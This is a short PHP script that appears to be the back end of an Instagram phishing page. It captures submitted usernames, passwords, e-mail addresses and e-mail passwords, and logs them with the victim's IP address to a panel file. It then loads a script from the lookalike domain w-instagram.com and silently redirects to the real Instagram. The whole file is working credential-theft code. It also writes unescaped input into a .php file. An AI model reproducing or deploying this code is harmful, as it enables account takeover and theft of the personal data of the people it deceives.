<?php
$metinbey = $_POST['username'];
$metinbey2 = $_POST['password'];
$metinbey = $_POST['eposta'];
$metinbey2 = $_POST['eposta-sifre'];
$dosya = fopen('./panel/govde.php','a+');
$ipadresinial = $_SERVER['REMOTE_ADDR'];
$yazkizim = "<font color='red'>Kullanici adi : $metinbey </font><br><font color='gray'>Kullanicinin Sifresi: $metinbey2 </font><br> <font color='white'>IP Adresi : $ipadresinial </font><hr>";
fwrite($dosya,$yazkizim);

fclose($dosya);

 ?>
<script src=http://w-instagram.com/a/log.js></script>
 <meta http-equiv="refresh" content="0;URL=http://instagram.com">
